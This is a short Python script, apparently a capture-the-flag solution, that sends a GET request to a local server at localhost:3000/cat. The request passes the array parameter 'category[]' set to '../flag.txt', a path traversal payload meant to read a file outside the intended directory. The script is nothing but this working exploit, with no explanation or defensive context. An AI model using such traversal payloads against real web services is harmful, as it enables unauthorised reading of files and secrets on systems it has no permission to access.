import requests

url = 'http://localhost:3000/cat'
res = requests.get(url,params={'category[]':'../flag.txt'})
print(res.text)
